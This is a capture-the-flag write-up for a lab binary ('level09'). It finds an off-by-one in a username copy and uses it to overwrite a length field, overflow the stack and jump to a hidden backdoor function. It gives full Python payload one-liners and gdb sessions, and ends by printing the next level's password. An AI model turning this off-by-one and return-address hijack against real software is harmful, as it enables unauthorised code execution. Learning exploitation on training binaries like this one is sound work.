# level09

## Testing the binary

```sh
$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username <CTRL+d>
>>: >: Welcome, >: Msg @Unix-Dude <CTRL+d>
>>: >: Msg sent!
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
>: Msg sent!
```

Nothing special here, let's try to reverse it.

## Analysis

The `secret_backdoor` function is compiled, but is never called, so we must find a way to call it.

Every other functions uses the `n` variant of each standard functions, which means that they are not vulnerable to buffer overflow.

However, `set_username` copies manually the username into a 41 bytes buffer, which is an off-by-one vulnerability.

In the structure :

```c
typedef struct s_msg {
    char content[140];
    char username[40];
    int len;
}   t_msg;
```

The `len` field is just after the `username` field, so we can overwrite the first byte so the `set_msg` function will copy more bytes than expected.

We can set our username to 40 bytes `0x41` (=`A`), and then a `0xFF` to overwrite the first byte of `len` to `0xFF`.

## Exploiting

```sh
$ python -c 'print "A"*40 + "\xff"' + "\n" + 'B' * 1024 + "\n" > /tmp/09
(gdb) r < /tmp/09
Starting program: /home/users/level09/level09 < /tmp/09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

We now have to find a way to call the `secret_backdoor` function.

```sh
$ python -c 'print("A"*40 + "\xff" + "\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz" + "\n")' > /tmp/09
$ gdb ./level09
(gdb) r < /tmp/09
Starting program: /home/users/level09/level09 < /tmp/09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x7a7a7a7a79797979 in ?? ()
```

`0x7a7a7a7a79797979` is `zzzzyyyy` which is at 200 bytes after the beginning of the `username` buffer (swap endianness).

So from there, we can input 200 bytes of garbage, and then the address of the `secret_backdoor` function.

```sh
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

```sh
$ python -c 'import struct;print("A"*40 + "\xff" + "\n" + "A" * 200 + struct.pack("<Q", 0x55555555488c) + "\n" + "/bin/sh\n")' > /tmp/09
$ cat /tmp/09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
id
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```